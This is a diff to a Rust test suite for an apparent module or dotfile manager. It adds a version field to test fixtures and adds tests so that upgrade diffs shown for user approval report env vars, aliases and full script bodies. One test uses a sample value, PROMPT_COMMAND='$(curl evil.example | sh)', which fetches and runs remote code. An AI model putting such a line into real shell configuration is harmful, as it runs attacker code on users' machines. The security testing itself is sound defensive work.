@@ -563,6 +563,7 @@ fn resolve_local_files() {
     std::fs::write(config_dir.join("init.lua"), "-- test").unwrap();
 
     let module = LoadedModule {
+        version: None,
         name: "nvim".into(),
         spec: ModuleSpec {
             files: vec![ModuleFileEntry {
@@ -1230,6 +1231,7 @@ fn resolve_module_packages_skips_filtered() {
     let platform = macos_platform();
 
     let module = LoadedModule {
+        version: None,
         name: "test".into(),
         spec: ModuleSpec {
             packages: vec![
@@ -1473,6 +1475,7 @@ fn verify_lockfile_integrity_mismatch() {
 #[test]
 fn diff_module_specs_no_changes() {
     let module = LoadedModule {
+        version: None,
         name: "test".into(),
         spec: ModuleSpec {
             platforms: vec![],
@@ -1504,6 +1507,7 @@ fn diff_module_specs_no_changes() {
 #[test]
 fn diff_module_specs_detects_changes() {
     let old = LoadedModule {
+        version: None,
         name: "test".into(),
         spec: ModuleSpec {
             platforms: vec![],
@@ -1549,6 +1553,7 @@ fn diff_module_specs_detects_changes() {
     };
 
     let new = LoadedModule {
+        version: None,
         name: "test".into(),
         spec: ModuleSpec {
             platforms: vec![],
@@ -1924,6 +1929,7 @@ fn hash_module_contents_skips_symlinks() {
 #[test]
 fn diff_module_specs_scripts_changed() {
     let old = LoadedModule {
+        version: None,
         name: "test".into(),
         spec: ModuleSpec {
             platforms: vec![],
@@ -1942,6 +1948,7 @@ fn diff_module_specs_scripts_changed() {
         origin: None,
     };
     let new = LoadedModule {
+        version: None,
         name: "test".into(),
         spec: ModuleSpec {
             platforms: vec![],
@@ -1962,6 +1969,170 @@ fn diff_module_specs_scripts_changed() {
     let changes = diff_module_specs(&old, &new);
     assert!(changes.iter().any(|c| c.contains("+ postApply script")));
     assert!(changes.iter().any(|c| c.contains("- postApply script")));
+}
+
+// `diff_module_specs` is the pre-approval security review of
+// a module upgrade — it must never condense/truncate a multi-line script
+// body, or the user approves running code they never saw. The rendering
+// decision (bullet vs code_block) belongs to the caller.
+#[test]
+fn diff_module_specs_multiline_script_change_preserves_raw_body() {
+    let old = LoadedModule {
+        version: None,
+        name: "test".into(),
+        spec: ModuleSpec {
+            platforms: vec![],
+            depends: vec![],
+            packages: vec![],
+            files: vec![],
+            env: vec![],
+            aliases: vec![],
+            scripts: Some(crate::config::ScriptSpec {
+                post_apply: vec![],
+                ..Default::default()
+            }),
+            system: HashMap::new(),
+        },
+        dir: PathBuf::from("/tmp"),
+        origin: None,
+    };
+    let raw_body = "echo line-one\necho line-two\necho line-three";
+    let new = LoadedModule {
+        version: None,
+        name: "test".into(),
+        spec: ModuleSpec {
+            platforms: vec![],
+            depends: vec![],
+            packages: vec![],
+            files: vec![],
+            env: vec![],
+            aliases: vec![],
+            scripts: Some(crate::config::ScriptSpec {
+                post_apply: vec![crate::config::ScriptEntry::Simple(raw_body.to_string())],
+                ..Default::default()
+            }),
+            system: HashMap::new(),
+        },
+        dir: PathBuf::from("/tmp"),
+        origin: None,
+    };
+    let changes = diff_module_specs(&old, &new);
+    let script_change = changes
+        .iter()
+        .find(|c| c.contains("+ postApply script"))
+        .expect("script addition should be reported");
+    assert!(
+        script_change.contains("echo line-three"),
+        "diff must preserve the FULL raw body for pre-approval review, got: {script_change}"
+    );
+    assert_eq!(
+        script_change,
+        &format!("+ postApply script: {raw_body}"),
+        "diff must push the raw body byte-identical, not condensed"
+    );
+}
+
+fn module_with_env_and_aliases(env: &[(&str, &str)], aliases: &[(&str, &str)]) -> LoadedModule {
+    LoadedModule {
+        version: None,
+        name: "test".into(),
+        spec: ModuleSpec {
+            env: env
+                .iter()
+                .map(|(name, value)| crate::config::EnvVar {
+                    name: (*name).into(),
+                    value: (*value).into(),
+                })
+                .collect(),
+            aliases: aliases
+                .iter()
+                .map(|(name, command)| crate::config::ShellAlias {
+                    name: (*name).into(),
+                    command: (*command).into(),
+                })
+                .collect(),
+            ..Default::default()
+        },
+        dir: PathBuf::from("/tmp"),
+        origin: None,
+    }
+}
+
+// An env var or alias an upgrade introduces reaches the login shell of every
+// new terminal, so it belongs on the approval surface alongside a post-apply
+// script rather than arriving unannounced.
+#[test]
+fn diff_module_specs_reports_env_additions_removals_and_edits() {
+    let old = module_with_env_and_aliases(&[("KEEP", "1"), ("EDIT", "old"), ("GONE", "x")], &[]);
+    let new = module_with_env_and_aliases(&[("KEEP", "1"), ("EDIT", "new"), ("ADDED", "y")], &[]);
+
+    let changes = diff_module_specs(&old, &new);
+    assert!(
+        changes.contains(&"+ env: ADDED=y".to_string()),
+        "{changes:?}"
+    );
+    assert!(
+        changes.contains(&"- env: GONE=x".to_string()),
+        "{changes:?}"
+    );
+    assert!(
+        changes.contains(&"~ env 'EDIT': old -> new".to_string()),
+        "{changes:?}"
+    );
+    assert!(!changes.iter().any(|c| c.contains("KEEP")), "{changes:?}");
+}
+
+#[test]
+fn diff_module_specs_reports_alias_additions_removals_and_edits() {
+    let old = module_with_env_and_aliases(&[], &[("keep", "ls"), ("edit", "vi"), ("gone", "cat")]);
+    let new =
+        module_with_env_and_aliases(&[], &[("keep", "ls"), ("edit", "nvim"), ("added", "bat")]);
+
+    let changes = diff_module_specs(&old, &new);
+    assert!(
+        changes.contains(&"+ alias: added=bat".to_string()),
+        "{changes:?}"
+    );
+    assert!(
+        changes.contains(&"- alias: gone=cat".to_string()),
+        "{changes:?}"
+    );
+    assert!(
+        changes.contains(&"~ alias 'edit': vi -> nvim".to_string()),
+        "{changes:?}"
+    );
+    assert!(!changes.iter().any(|c| c.contains("keep")), "{changes:?}");
+}
+
+// The value is the payload under review, so it is pushed byte-identical the
+// same way a script body is — a newline inside it must survive to the caller
+// that decides how to render it.
+#[test]
+fn diff_module_specs_pushes_env_and_alias_payloads_raw() {
+    let old = module_with_env_and_aliases(&[], &[]);
+    let new = module_with_env_and_aliases(
+        &[("PROMPT_COMMAND", "$(curl evil.example | sh)")],
+        &[("ls", "line-one\nline-two")],
+    );
+
+    let changes = diff_module_specs(&old, &new);
+    assert!(
+        changes.contains(&"+ env: PROMPT_COMMAND=$(curl evil.example | sh)".to_string()),
+        "{changes:?}"
+    );
+    assert!(
+        changes.contains(&"+ alias: ls=line-one\nline-two".to_string()),
+        "{changes:?}"
+    );
+}
+
+#[test]
+fn diff_module_specs_identical_env_and_aliases_report_no_changes() {
+    let module = module_with_env_and_aliases(&[("A", "1")], &[("b", "c")]);
+    assert_eq!(
+        diff_module_specs(&module, &module),
+        vec!["(no spec changes)"]
+    );
 }
 
 #[test]
@@ -2067,6 +2238,7 @@ fn extract_registry_name_empty_returns_none() {
 
 fn make_loaded_module(name: &str, spec: crate::config::ModuleSpec) -> LoadedModule {
     LoadedModule {
+        version: None,
         name: name.to_string(),
         spec,
         dir: PathBuf::from("/fake"),
@@ -2611,6 +2783,7 @@ fn resolve_module_files_local_relative() {
     std::fs::write(mod_dir.join("vimrc"), "set nocompat").unwrap();
 
     let module = LoadedModule {
+        version: None,
         name: "mymod".into(),
         spec: ModuleSpec {
             files: vec![ModuleFileEntry {
@@ -2652,6 +2825,7 @@ fn resolve_module_files_accepts_a_source_that_names_the_module_dir() {
     // names-nothing-of-its-own guard that `..` shares.
     let module = LoadedModule {
         name: "wholetree".into(),
+        version: None,
         spec: ModuleSpec {
             files: vec![ModuleFileEntry {
                 patch: None,
@@ -2689,6 +2863,7 @@ fn resolve_module_files_path_traversal_rejected() {
     std::fs::create_dir_all(&mod_dir).unwrap();
 
     let module = LoadedModule {
+        version: None,
         name: "evil".into(),
         spec: ModuleSpec {
             files: vec![ModuleFileEntry {
@@ -2727,6 +2902,7 @@ fn resolve_module_files_multiple_files() {
     std::fs::write(mod_dir.join("zshrc"), "# zshrc").unwrap();
 
     let module = LoadedModule {
+        version: None,
         name: "multi".into(),
         spec: ModuleSpec {
             files: vec![
@@ -2779,6 +2955,7 @@ fn resolve_module_files_empty_spec() {
     std::fs::create_dir_all(&mod_dir).unwrap();
 
     let module = LoadedModule {
+        version: None,
         name: "empty".into(),
         spec: ModuleSpec::default(),
         dir: mod_dir,
@@ -2809,6 +2986,7 @@ fn resolve_module_files_symlink_escape_rejected() {
     std::os::windows::fs::symlink_file(&outside_file, mod_dir.join("escape.txt")).unwrap();
 
     let module = LoadedModule {
+        version: None,
         name: "tricky".into(),
         spec: ModuleSpec {
             files: vec![ModuleFileEntry {
@@ -2896,6 +3074,7 @@ fn dependency_order_deep_chain_within_limit() {
         modules.insert(
             name.clone(),
             LoadedModule {
+                version: None,
                 name: name.clone(),
                 spec: ModuleSpec {
                     depends: deps,
@@ -2926,6 +3105,7 @@ fn dependency_order_exceeds_depth_limit() {
         modules.insert(
             name.clone(),
             LoadedModule {
+                version: None,
                 name: name.clone(),
                 spec: ModuleSpec {
                     depends: deps,
@@ -3531,6 +3711,7 @@ fn load_source_modules_script_gating_does_not_touch_local_modules() {
     modules.insert(
         "shared".to_string(),
         LoadedModule {
+            version: None,
             name: "shared".into(),
             spec: crate::config::ModuleSpec::default(),
             dir: source.path().to_path_buf(),
@@ -3802,6 +3983,7 @@ fn resolve_modules_source_module_with_unoffered_transitive_dep_is_missing_depend
 #[test]
 fn diff_module_specs_file_changes() {
     let old = LoadedModule {
+        version: None,
         name: "mymod".into(),
         spec: ModuleSpec {
             files: vec![
@@ -3830,6 +4012,7 @@ fn diff_module_specs_file_changes() {
         origin: None,
     };
     let new = LoadedModule {
+        version: None,
         name: "mymod".into(),
         spec: ModuleSpec {
             files: vec![
@@ -3875,11 +4058,13 @@ fn diff_module_specs_file_changes() {
     );
 }
 
+// An env-only upgrade is a real, user-visible change: the value lands in the
+// login-shell startup files of every new terminal. Reporting it as
+// "(no spec changes)" would let it through the approval prompt unmentioned.
 #[test]
-fn diff_module_specs_env_changes_not_tracked() {
-    // diff_module_specs currently only tracks deps, packages, files, and scripts.
-    // Env changes should result in "(no spec changes)" since env isn't diffed.
+fn diff_module_specs_env_only_change_is_still_a_change() {
     let old = LoadedModule {
+        version: None,
         name: "mymod".into(),
         spec: ModuleSpec {
             env: vec![crate::config::EnvVar {
@@ -3892,6 +4077,7 @@ fn diff_module_specs_env_changes_not_tracked() {
         origin: None,
     };
     let new = LoadedModule {
+        version: None,
         name: "mymod".into(),
         spec: ModuleSpec {
             env: vec![crate::config::EnvVar {
@@ -3905,11 +4091,7 @@ fn diff_module_specs_env_changes_not_tracked() {
     };
 
     let changes = diff_module_specs(&old, &new);
-    assert_eq!(
-        changes,
-        vec!["(no spec changes)"],
-        "env-only change should show as no spec changes (env not diffed)"
-    );
+    assert_eq!(changes, vec!["+ env: NEW=2", "- env: OLD=1"]);
 }
 
 // -----------------------------------------------------------------------
@@ -4089,6 +4271,7 @@ fn resolve_module_packages_multiple_packages() {
     let platform = macos_platform();
 
     let module = LoadedModule {
+        version: None,
         name: "tools".into(),
         spec: ModuleSpec {
             packages: vec![
@@ -4128,6 +4311,7 @@ fn resolve_module_packages_empty_packages() {
     let platform = macos_platform();
 
     let module = LoadedModule {
+        version: None,
         name: "empty".into(),
         spec: ModuleSpec::default(),
         dir: PathBuf::from("/fake/empty"),
@@ -4150,6 +4334,7 @@ fn resolve_module_packages_mixed_platforms() {
     let platform = linux_ubuntu_platform();
 
     let module = LoadedModule {
+        version: None,
         name: "mixed".into(),
         spec: ModuleSpec {
             packages: vec![
@@ -4708,6 +4893,7 @@ fn dependency_order_exceeds_module_count_limit() {
         modules.insert(
             name.clone(),
             LoadedModule {
+                version: None,
                 name: name.clone(),
                 spec: ModuleSpec::default(),
                 dir: PathBuf::from(format!("/fake/{name}")),
